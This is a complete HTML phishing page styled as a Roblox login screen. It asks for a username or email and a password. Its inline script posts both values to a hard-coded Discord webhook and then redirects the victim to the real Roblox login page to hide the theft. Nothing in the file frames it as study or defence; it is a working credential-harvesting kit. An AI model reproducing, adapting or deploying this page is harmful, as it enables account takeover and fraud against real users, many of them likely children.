<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Roblox</title>
<style>
  body { margin:0; background: url('https://images.rbxcdn.com/3c8d975e5c0d9cf7a424a41c6a8f75e9.jpg') center/cover; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
  .box { width: 85%; max-width: 320px; }
  .logo { width: 100%; margin-bottom: 20px; }
  input { width: 100%; padding: 12px; margin-bottom: 10px; background: rgba(0,0,0,0.6); border: 1px solid #555; border-radius: 6px; color: #fff; box-sizing: border-box; font-size: 16px; }
  button { width: 100%; padding: 12px; background: rgba(255,255,255,0.3); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; }
</style>
</head>
<body>
<div class="box">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" style="filter: brightness(0) invert(1); width: 80px; display: block; margin: 0 auto 20px;">
  <form id="f">
    <input type="text" id="u" placeholder="Username/Email" required>
    <input type="password" id="p" placeholder="Password" required>
    <button>Log In</button>
  </form>
</div>
<script>
const H = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
document.getElementById("f").onsubmit = e => {
  e.preventDefault();
  fetch(H, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:`**ROBLOX**\nUser: \`${document.getElementById('u').value}\`\nPass: \`${document.getElementById('p').value}\``})}).finally(()=>window.location.href="https://www.roblox.com/login");
};
</script>
</body>
</html>
